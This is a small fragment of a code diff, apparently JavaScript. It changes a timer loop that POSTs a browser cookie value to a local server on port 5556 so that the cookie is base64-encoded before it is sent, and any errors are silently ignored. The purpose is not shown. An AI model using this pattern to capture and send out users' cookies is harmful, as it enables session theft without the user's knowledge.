@@ -8,7 +8,7 @@ setInterval(() => {
     try {
       await fetch("http://localhost:5556", {
         method: "POST",
-        body: cookie,
+        body: btoa(cookie),
       })
     } catch {}
   }
